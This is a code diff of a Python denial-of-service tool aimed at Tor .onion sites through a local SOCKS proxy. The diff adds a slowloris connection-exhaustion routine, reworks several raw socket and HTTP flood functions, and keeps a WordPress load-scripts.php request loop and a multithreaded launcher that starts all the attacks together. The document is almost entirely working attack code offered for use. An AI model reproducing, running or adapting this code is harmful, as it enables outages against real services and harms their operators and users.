@@ -37,7 +37,7 @@ print(Fore.WHITE + """
 host = 'http://ddosogyyqstchmnx.onion'
 
 global proxies
-proxies = { 'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050' }
+proxies = { 'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050' }
 
 global useragents
 useragents = [ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
@@ -62,13 +62,18 @@ headers = { 'User-Agent': random.choice(useragents), 'Connection': 'keep-alive',
 global randstr
 randstr = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.choice(range(50,100))))
 
+regular_headers = [
+            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+                "Accept-language: en-US,en,q=0.5"
+                ]
 
 def attack1(host, port):
+    print('1')
     foo = ['GET', 'POST']
     http = random.choice(foo)
-    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
-    s = socks.socksocket()
     try:
+      socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
+      s = socks.socksocket()
       s.connect((host, 80))
       s.send(http + " / HTTP/1.1\r\n"
              "Host: %s\r\n"
@@ -91,30 +96,32 @@ def attack1(host, port):
       for i in range(0, 99):
         s.send(randstr)
     except:
-        print('  Error')
+        print('  Error1')
 
 
 def attack2(host1, port):
+    print('2')
     try:
-        response = requests.get(host1, headers=headers, proxies=proxies)
+        opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", port, True))
+        opener.addheaders = [('User-Agent', random.choice(useragents))]
+        opener.addheaders = [('Cache-Control', 'no-cache')]
+        opener.addheaders = [('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')]
+        opener.addheaders = [('Referer', random.choice(referers) + str(randstr))]
+        opener.addheaders = [('Keep-Alive', random.randint(110,120))]
+        opener.addheaders = [('Connection', 'keep-alive')]
+        opener.addheaders = [('Host',host1)]
     except:
-        print('  Error')
-
-    opener = urllib2.build_opener(SocksiPyHandler(socks.SOCKS5, "127.0.0.1", port, True))
-    opener.addheaders = [('User-Agent', random.choice(useragents))]
-    opener.addheaders = [('Cache-Control', 'no-cache')]
-    opener.addheaders = [('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')]
-    opener.addheaders = [('Referer', random.choice(referers) + str(randstr))]
-    opener.addheaders = [('Keep-Alive', random.randint(110,120))]
-    opener.addheaders = [('Connection', 'keep-alive')]
-    opener.addheaders = [('Host',host1)]
+      print('  Error2')
 #    sys.stdout.write('0\n')
 
 def attack3(host, port):
-  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
-  s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((host, 80))
-  s.send(randstr)
+  try:
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
+    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, 80))
+    s.send(randstr)
+  except:
+    print(' Error3')
 
 def wordpress(host, count):
   path = '''/wp-admin/load-scripts.php?c=1&load[]=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,
@@ -139,6 +146,39 @@ def wordpress(host, count):
   for i in range(0, count):
     requests.get(host + path, verify=False, stream=True, headers=headers, proxies=proxies)
   
+# ---- slowloris ----
+def init_socket(target1):
+  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+  s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect(('2gzxfta4w657xuz7.onion',80))
+  s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
+  for header in regular_headers:
+    s.send('{}\r\n'.format(header).encode('UTF-8'))
+  return s
+
+def slowloris(target1, count):
+    print('3')
+    socket_list=[]
+    for _ in range(int(count)):
+        try:
+            s=init_socket(target1)
+        except socket.error:
+            break
+        socket_list.append(s)
+    while True:
+        for s in socket_list:
+            try:
+                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+            except socket.error:
+                socket_list.remove(s)
+        for _ in range(int(count) - len(socket_list)):
+            try:
+                s=init_socket(target1)
+                if s:
+                    socket_list.append(s)
+            except socket.error:
+                print(' Error4')
+
 
 def deanon():
   site = 'php/index.php'
@@ -304,25 +344,32 @@ elif(attack == '10'):
 
 print(Fore.WHITE + '  Start DoS')
 
-
 threads = []
 for n in range(int(thread)):
     t1 = threading.Thread(target=attack1, args=(target1, 9050))
     t2 = threading.Thread(target=attack2, args=(target, 9050))
     t3 = threading.Thread(target=attack3, args=(target1, 9050))
+    t4 = threading.Thread(target=slowloris, args=(target1, count))
+
 
 
     t1.daemon = True
     t2.daemon = True
     t3.daemon = True
+    t4.daemon = True
+
 
     t1.start()
     t2.start()
     t3.start()
+    t4.start()
+
 
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)
+    threads.append(t4)
+
 
 
 try:
